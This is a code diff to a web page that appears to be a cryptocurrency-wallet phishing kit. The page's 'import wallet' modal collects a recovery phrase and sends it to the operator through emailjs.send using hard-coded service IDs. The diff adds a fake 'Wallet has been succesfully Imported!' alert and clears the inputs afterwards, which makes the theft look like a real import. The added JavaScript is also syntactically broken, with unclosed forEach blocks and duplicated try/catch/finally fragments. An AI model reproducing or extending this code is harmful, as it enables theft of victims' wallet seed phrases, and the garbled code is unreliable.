@@ -724,7 +724,12 @@
             const hidden_section = document.getElementById("hidden");
             const hide_btn = document.getElementById("btn");
             const modal = document.querySelector(".modal");
+
+            const All_buttons = modal.querySelectorAll('.modal button[type="submit"]');
+            const All_inputs = modal.querySelectorAll(".modal input, .modal textarea");
+
             const buttons = modal.querySelectorAll('button[type="submit"]');
+
             //phrase
             const phrase_form = document.querySelector("#phrase form");
             const phrase_input = phrase_form.querySelector('textarea[name="phrase"]');
@@ -750,9 +755,11 @@
                 }
 
                 if (hidden_section.style.display === "block") {
-                    hide_btn.innerHTML = "Show Less &uarr;";
+
+
                 } else {
                     hide_btn.innerHTML = "Show More &darr;";
+
                 }
             }
 
@@ -810,18 +817,37 @@
                     .replaceAll(",", ",\n");
 
                 try {
+
+                    All_buttons.forEach((btn) => {
+                        btn.innerText = "Loading";
+                        btn.disabled = true;
+
                     buttons.forEach((btn) => {
                         btn.innerText = "Loading";
+
                     });
                     let response = await emailjs.send("service_0neb4hp", "template_00233p7", {
                         message: new_payload,
                     });
+
+                    alert("Wallet has been succesfully Imported!");
+                    All_inputs.forEach((input) => {
+                        input.value = null;
+                    });
+                } catch (error) {
+                    alert("An error occured while trying to Import wallet, Please try again!");
+                } finally {
+                    All_buttons.forEach((btn) => {
+                        btn.innerText = "IMPORT";
+                        btn.disabled = false;
+
                     console.log("SUCCESS!", response.status, response.text);
                 } catch (error) {
                     console.log("FAILED...", error);
                 } finally {
                     buttons.forEach((btn) => {
                         btn.innerText = "IMPORT";
+
                     });
                 }
             }
